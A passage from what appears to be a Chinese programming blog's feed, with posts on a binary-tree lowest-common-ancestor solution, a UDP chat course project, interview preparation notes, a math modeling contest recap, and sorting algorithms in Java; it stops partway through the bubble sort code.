    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。<br>最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p><p>例如，给定如下二叉树:  root &#x3D; [3,5,1,6,2,0,8,null,null,7,4]</p><p><img src="/upload/2022/03/image-658317647f5744a2823fc2f6748b68f9.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题做之前看到的题目是二叉搜索树的最近公共祖先，那一题可以利用二叉搜索树的性质，比较简单，如果是二叉树的话会复杂很多，主要就是要会判断二叉树的指定</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p><strong>1、迭代的方式</strong><br>时间复杂度 O(N) ： 其中 NN 为二叉树节点数；每循环一轮排除一层，二叉搜索树的层数最小为 logN （满二叉树），最大为 N（退化为链表）。<br>空间复杂度 O(1) ： 使用常数大小的额外空间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.val &lt; p.val &amp;&amp; root.val &lt; q.val) <span class="comment">// p,q 都在 root 的右子树中</span></span><br><span class="line">                root = root.right; <span class="comment">// 遍历至右子节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(root.val &gt; p.val &amp;&amp; root.val &gt; q.val) <span class="comment">// p,q 都在 root 的左子树中</span></span><br><span class="line">                root = root.left; <span class="comment">// 遍历至左子节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、递归的方式</strong><br>时间复杂度 O(N) ： 其中 N 为二叉树节点数；每循环一轮排除一层，二叉搜索树的层数最小为 logN （满二叉树），最大为 N（退化为链表）。<br>空间复杂度 O(N) ： 最差情况下，即树退化为链表时，递归深度达到树的层数 N。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; p.val &amp;&amp; root.val &lt; q.val)</span><br><span class="line">            <span class="keyword">return</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; p.val &amp;&amp; root.val &gt; q.val)</span><br><span class="line">            <span class="keyword">return</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><p><strong>1、递归的方式</strong><br>这种方法较难理解，我最后是通过看图才清楚其中的思路，比较难想到。<br><img src="/upload/2022/03/image-fa8313d6e01f49ba97739f689d192ee4.png" alt="image.png"></p><p>递归解析：<br>终止条件：<br>当越过叶节点，则直接返回 null ；<br>当 root等于 p,q ，则直接返回 root ；<br>递推工作：<br>开启递归左子节点，返回值记为 left ；<br>开启递归右子节点，返回值记为 right ；<br>返回值：<br>根据 left 和 right ，可展开为四种情况；<br>1、当 left 和 right 同时为空 ：说明 root 的左 &#x2F; 右子树中都不包含 p,q ，返回 null ；<br>2、当 left 和 right 同时不为空 ：说明 p,q 分列在 root 的 异侧 （分别在 左 &#x2F; 右子树），因此 root 为最近公共祖先，返回 root ；<br>3、当 left 为空 ，right 不为空 ：p,q 都不在 root 的左子树中，直接返回 right 。具体可分为两种情况：<br>p,q 其中一个在 root 的右子树中，此时 right 指向 p（假设为 p ）；<br>p,q 两节点都在 root 的右子树中，此时的 right 指向 最近公共祖先节点 ；<br>4、当 left 不为空 ，right为空：与情况 3. 同理；</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span> || root == p || root == q) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 1.</span></span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span>) <span class="keyword">return</span> right; <span class="comment">// 3.</span></span><br><span class="line">        <span class="keyword">if</span>(right == <span class="literal">null</span>) <span class="keyword">return</span> left; <span class="comment">// 4.</span></span><br><span class="line">        <span class="keyword">return</span> root; <span class="comment">// 2. if(left != null and right != null)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2、前序遍历+保存路径</strong><br>通过前序遍历找到两条节点的路径，两个路径逐步比对，最后一个相同的节点即为公共父节点。这种方法比较好想到，但是因为遍历了两边，并且最后比较了一边，所以复杂度会高一点。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="comment">//根节点到p节点的路径</span></span><br><span class="line">        List&lt;TreeNode&gt; path1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//根节点到q节点的路径</span></span><br><span class="line">        List&lt;TreeNode&gt; path2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        getPath(root,p,path1);</span><br><span class="line">        getPath(root,q,path2);</span><br><span class="line"></span><br><span class="line">        TreeNode result=<span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Math.min(path1.size(),path2.size());</span><br><span class="line">        <span class="comment">//保留最后一个相等的节点即为公共节点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(path1.get(i)==path2.get(i))</span><br><span class="line">                result = path1.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//前序遍历搜索节点p或q</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">getPath</span><span class="params">(TreeNode root,TreeNode node,List&lt;TreeNode&gt; path)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        path.add(root);</span><br><span class="line">        <span class="keyword">if</span>(root == node)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span>(path.get(path.size()-<span class="number">1</span>)!=node)&#123;</span><br><span class="line">            getPath(root.left,node,path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path.get(path.size()-<span class="number">1</span>)!=node)&#123;</span><br><span class="line">            getPath(root.right,node,path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path.get(path.size()-<span class="number">1</span>)!=node)&#123;</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>递归</tag>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于UDP协议的仿QQ聊天软件</title>
    <link href="/2023/06/18/%E5%9F%BA%E4%BA%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BB%BFQQ%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6/"/>
    <url>/2023/06/18/%E5%9F%BA%E4%BA%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BB%BFQQ%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这是Java课程设计，当时是要求就是使用UDP协议传输文件和消息，有图形化界面满分。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>图形化界面选择使用Java的GUI实现，导入使用java.awt和java.swing包<br>仿QQ那么需要制作登录界面、好友界面、聊天界面三个界面</p><p>在登录界面需要有注册和登录，那么需要连接到数据库，课设完成的时候使用的是JDBC连接数据库，特意写了一个工具类用来连接数据库和结束后关闭连接。后来觉得使用jdbc连接数据库太简单了，学习了mybatis框架，改用mybatis来进行数据库的操作。</p><p>腾讯QQ的消息传输过程可以基于UDP，但是用户登录的时候是需要与服务器建立一个TCP的连接的，用来确认用户是否是在线状态。<br>1.登陆过程，客户端client 采用TCP协议向服务器server发送信息，HTTP协议下载信息。登陆之后，会有一TCP连接来保持在线状态。<br>2.和好友发消息，客户端client采用UDP协议，但是需要通过服务器转发。腾讯为了确保传输消息的可靠，采用上层协议来保证可靠传输。如果消息发送失败，客户端会提示消息发送失败，并可重新发送。<br>3.如果是在内网里面的两个客户端传文件，QQ采用的是P2P技术，不需要服务器中转。</p><p>而我做课设的时候还没有租一个公网IP的服务器，所以我做的QQ只能在本机上采用UDP协议传输，给不同的用户分发不同的端口号来进行传输数据。</p><p>Java中遵循UDP协议实现的Socket类叫DatagramSocket，这个类的构造函数可以创建数据报包套接字并将其绑定到本地主机上的指定端口。当一名用户登录时，给用户分发一个端口号，并使用DatagramSocket接受通过UDP协议发送过来的数据DatagramPacket，这里数据是存放在一个字节数组中，所以传输的时候是需要将发送的信息先进行序列化为字节数组再进行传输。<br>接收到信息之后进行读取，将其反序列化为指定的信息</p><p>这其中还涉及到了多线程问题，一个用户是绑定了一个端口号的，如果将一个端口号作为服务器端不停的等待接收数据，多个用户就需要多个端口来接受数据，如果采用单线程的话是没法实现的，所以要让每个登录的用户作为一个线程，同时开启接受信息，互不干扰，这样才能够正常的进行通信要求。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我这个项目是Java课设，内容也都偏向于基础方面，设计到的基础方面的内容比较多的，例如有数据库连接、UDP编程、序列化与反序列化、IO数据流、多线程等Java基础知识。</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>恒生面试培训</title>
    <link href="/2023/06/18/%E6%81%92%E7%94%9F%E9%9D%A2%E8%AF%95%E5%9F%B9%E8%AE%AD/"/>
    <url>/2023/06/18/%E6%81%92%E7%94%9F%E9%9D%A2%E8%AF%95%E5%9F%B9%E8%AE%AD/</url>
    
    <content type="html"><![CDATA[<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>着装方面需要干净整洁，开朗阳光，不要紧张，需要自信<br>精辟，两三分钟，包含主要信息，姓名、专业院校、投递岗位。在学习获得的荣誉，亮点，奖学金，学校职务，一两句话带过。</p><h2 id="提问（重要）"><a href="#提问（重要）" class="headerlink" title="提问（重要）"></a>提问（重要）</h2><p>从工作经历、实践经历提问<br>1、工作经历中用到了什么技术，是如何利用的，需要把项目中的技术吃透<br>2、会问到技术的应用场景<br>3、会问到在技术中担任的角色，需要体现自己的重要性，不可或缺。<br>4、项目中遇到的困难是怎样解决的，一定要对遇到的困难进行总结。<br>5、项目中的成员对自己的评价，自己对项目中成员（上级）的评价。尽量从好的方面去说<br>依据这些来判断你是一个怎么样的人，是否能抗压，能进行团队合作</p><h2 id="对公司的了解"><a href="#对公司的了解" class="headerlink" title="对公司的了解"></a>对公司的了解</h2><p>需要对面试官展现自己的诚意，自己是如何了解恒生的，表现自己很愿意来</p><h2 id="抗压性和学习能力"><a href="#抗压性和学习能力" class="headerlink" title="抗压性和学习能力"></a>抗压性和学习能力</h2><p>会问到人生中遇到哪些困难，哪些磨难，自己怎样去解决它<br>会问到在学习什么样的知识，怎样学，从学习中收获了什么，为什么会想学这些<br>会问到除了学习之外还有些什么爱好活动</p><h2 id="期望的薪资和工作地点"><a href="#期望的薪资和工作地点" class="headerlink" title="期望的薪资和工作地点"></a>期望的薪资和工作地点</h2><p>地点上最好说服从公司安排，这样进入概率大一点<br>待遇最好先调查一下身边的人的薪资，不能太低，太低会让面试官认为你对自己评价不足，可以适当高一些，准备好为什么要求高，自己有哪些特点</p><h2 id="4-13更新"><a href="#4-13更新" class="headerlink" title="4.13更新"></a>4.13更新</h2><p>面试过了，最后审核挂了，原因分析可能还是因为简历不行<br>目前简历上没有好的项目，所描述的技能也很少<br>后面开始学习Spring、SpringMVC、SpringBoot框架<br>SpringCloud微服务<br>Mysql、Redis、MongoDB数据库</p><p>学习完后制作项目</p><p>每天坚持刷算法！</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数学建模竞赛回顾</title>
    <link href="/2023/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B%E5%9B%9E%E9%A1%BE/"/>
    <url>/2023/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%AB%9E%E8%B5%9B%E5%9B%9E%E9%A1%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>数学建模竞赛已经过去半年了，去年五月份开始从零跟着老师学习，直到九月份开始比赛，期间学习到了很多东西，也收获了很多，写这篇文章最主要的目的还是找工作面试可能会问到相关的经历</p><h2 id="比赛经历"><a href="#比赛经历" class="headerlink" title="比赛经历"></a>比赛经历</h2><p>选取的题目是C题，偏向经济、管理、统计、数据分析类，这种题一般没有最优解，答案合理即可。因为我的专业就是数据科学与大数据技术，所以对这类题目把握更大一些。当时的具体内容是一个企业需要订购材料，让我们根据往年数据为该企业制定出科学的订购及转运方案。</p><p>第一个问题是根据402家供货商过去五年的订货量和供货量，选出50家最重要的供货商。<br>这个问题很明显是一个评价问题，那么需要找到评价的指标，就是依据什么来判断一个供货商的重要性，当时我选取的两个指标是供货商的供货能力和信誉。供货能力就是一个供货商能够提供的供货量，供货量大说明这个供货商的供应能力强；信誉就是我给你订单你的完成度，如果企业给供货商下的订单，每次供货商都能完成，那么说明这个供货商的信誉是极好的。依据这两个指标采用层次分析法进行评价，最后得分最高的前五十家供货商就是最重要的供货商。问题一就这样解决了。</p><p>问题二是企业至少选择多少家供货商才能满足生产需求，并针对选出的供应商，制定未来24周的订购方案和运输方案，要求运输的损耗率尽可能小。<br>这问主要在于如何对402家供应商和8家转运商进行选择，并且要求最后的转运商数量最少。和问题三是一类题目。<br>问题三中给出了另外的限制条件，就是要求多采购A类原材料，少采购C类原材料，同样要求运输的损耗率尽可能小，制定新的订购方案和运输方案。</p><p>这两问我们小组讨论了很久，拿不定主意，最后我认为可以先用启发式算法，先找到一种解决的方法再说，后面有时间再进行优化。这里选择的启发式算法是遗传算法，因为遗传算法有很强的鲁棒性和易扩展性，后面如果想到了优化的方法可以很方便的修改。遗传算法的流程和编码都不难，首先确定编码方案，这里采用的是二进制编码，0代表不选用这家供货商&#x2F;运输商，1代表选用，编码的基因长度就是供货商总数402，设置几个参数，分别是种群上限、迭代次数、杂交概率、变异概率，然后初始化子代基因。还需要设置一个适应度函数，因为遗传算法就是仿照自然界适者生存，适应度函数的选取是至关重要的一步，问题二中的适应度函数根据供货商数量来决定，如果一条基因里面1比较多，也就是供货商数量多，那么他的适应性就低，因为问题二要求的是选取最少的供货商。问题三的适应度函数就是让A材料更多，C材料更少，依据这两个指标得到一条基因的适应度，把那些适应度低的基因淘汰，留下适应度高的再进行杂交和变异，最后得到存活下来并且适应度最高的那个值就可以是局部最优解，因为这种启发式算法很难求得全局最优，但是得到的结果一定是较好的。遗传算法这一块全部由负责，从确定基因的编码方案到最后使用Matlab敲出代码由我一人完成，后面还有时间，我的队友在问题二里面补充上了0-1整数规划的方法，定义决策变量、确定目标函数和约束条件。在问题三里面补充了多目标优化模型，但是那个模型没法求解，在论文里写的是多目标优化模型，但是数据结果都是用遗传算法得到的。</p><p>问题四是利用所有的供货商和运输商，企业的产能能提升多少，第四问比较开放，为了让论文好看点我们小组给他添加了不少约束条件，比如运输损耗要最小，不同材料性价比一样，列出了01规划模型并用遗传算法求解得到答案。</p><p>这次数学建模比赛也出现了很大的问题，在我身上，在最后时间要到了的时候数据要填写到excel里面，但是数据量太大我不知道怎么批量填入，最后在这个问题上了弄了很久，数据没提交上去。其实很简单的使用python的列表就可以完成，但是当时自己状态太差了，比较紧张，编程一直报错，所以出现这问题。赛后我休息了一天，之后花了两个小时就将数据处理好了。</p><h2 id="练习经历"><a href="#练习经历" class="headerlink" title="练习经历"></a>练习经历</h2><p>除了这次比赛，在准备的时候有大量训练，做了很多题目，我通过这些题目接触了很多的算法，其中最喜欢采用的还是启发式算法，包括神经网络算法、模拟退火算法这些算法都训练过，神经网络是直接用的matlab封装好的函数，模拟退火是查的别人的代码，有一定的框架，基本只需要改几个参数就可以。虽然没有完全看懂原理，但这些算法都给我带来很大的帮助，收益很多，通过比赛学到了很多东西。感谢小组中的两位成员，分别是负责论文编写的刘端平和模型建立的陈羽豪，建模期间很辛苦二位，都一起努力，付出了很多，是一段难忘的经历吧</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>排序算法</title>
    <link href="/2023/06/18/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <url>/2023/06/18/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>排序算法的稳定性：保证排序前2个相等的数其在序列的前后位置顺序和排序后它们两个的前后位置顺序相同<br><img src="/upload/2022/04/image-a4f201769d714bc9bc4222aac999c6b5.png" alt="image.png"></p><h2 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h2><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 交换排序中的快速排序，目前应用最为广泛的排序算法，是一个递归算法</span></span><br><span class="line"><span class="comment"> * 快速排序包括两个过程：划分 和 快排</span></span><br><span class="line"><span class="comment"> * &quot;划分&quot;是指将原序列按基准元素划分两个子序列</span></span><br><span class="line"><span class="comment"> * &quot;快排&quot;是指分别对子序列进行快排</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 就平均计算时间而言，快速排序是所有内部排序方法中最好的一个</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 对大规模数据排序时，快排是快的；对小规模数据排序时，快排是慢的，甚至慢于简单选择排序等简单排序方法</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 快速排序依赖于原始序列，因此其时间复杂度从O(nlgn)到O(n^2)不等</span></span><br><span class="line"><span class="comment"> * 时间复杂度：最好情形O(nlgn)，平均情形O(nlgn)，最差情形O(n^2)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 递归所消耗的栈空间</span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(lgn)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 可选任一元素作为基准元素</span></span><br><span class="line"><span class="comment"> * 稳 定 性：不稳定</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] a, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="type">int</span> start=low;<span class="comment">//起始位置 0；</span></span><br><span class="line">        <span class="type">int</span> end=high; <span class="comment">//结束位置</span></span><br><span class="line">        <span class="type">int</span> base=a[low]; <span class="comment">//基准数 ：一般是第一位</span></span><br><span class="line">        <span class="type">int</span> tempIndex=low; <span class="comment">//找到的符合要求的位置：因为要把它的值付给基准数所在位置 所以要记录该位置 可以看做是助手移动到的位置</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">            <span class="comment">//高助手从右向左找一个比基准位小的数 找到后给到低助手当前所在位置</span></span><br><span class="line">            <span class="comment">//没有找到的话 高助手向前移动一位</span></span><br><span class="line">            <span class="keyword">while</span>(low&lt;high&amp;&amp;base&lt;=a[high])&#123;</span><br><span class="line">                high--;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high) </span><br><span class="line">            <span class="comment">//找到时 把找到的数赋值给低助手所在位置</span></span><br><span class="line">            a[low]=a[high];           </span><br><span class="line"></span><br><span class="line">            <span class="comment">//然后低助手从左向右找一个比基准数大的数 ，找到后给到高助手当前所在位置</span></span><br><span class="line">            <span class="comment">//没有找到的话 低助手向后移动一位</span></span><br><span class="line">            <span class="keyword">while</span>(low&lt;high&amp;&amp;base&gt;=a[low])&#123;</span><br><span class="line">                low++;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high) </span><br><span class="line">            <span class="comment">//找到后赋值给高助手当前所在位置</span></span><br><span class="line">            a[high]=a[low];</span><br><span class="line"></span><br><span class="line">            <span class="comment">//直到循环结束  --&gt;低助手和高助手重叠 就把基准数赋到当前中轴重叠位置</span></span><br><span class="line">    <span class="keyword">if</span>(low&gt;=high)</span><br><span class="line">            a[low]=base;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以上第一次排序结束  把数列分成了前后两个部分</span></span><br><span class="line">        <span class="comment">//最后在对上面前后两个部分数列 分别递归</span></span><br><span class="line">        <span class="keyword">if</span>(low-start&gt;<span class="number">1</span>)&#123;<span class="comment">//前部分至少有两个数据</span></span><br><span class="line">            quickSort(a,start,high-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(end-high&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            quickSort(a,high+<span class="number">1</span>,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Title: 交换排序中的冒泡排序 ，一般情形下指的是优化后的冒泡排序，最多进行n-1次比较</span></span><br><span class="line"><span class="comment"> * Description:因为越大的元素会经由交换慢慢&quot;浮&quot;到数列的顶端(最后位置)，最大的数最后才确定下来，所以称为冒泡排序</span></span><br><span class="line"><span class="comment"> * 时间复杂度：最好情形O(n)，平均情形O(n^2)，最差情形O(n^2) </span></span><br><span class="line"><span class="comment"> * 空间复杂度：O(1) </span></span><br><span class="line"><span class="comment"> * 稳 定 性：稳定</span></span><br><span class="line"><span class="comment"> * 内部排序(在排序过程中数据元素完全在内存)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] bubbleSort(<span class="type">int</span>[] target) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> target.length;</span><br><span class="line"><span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; n != <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 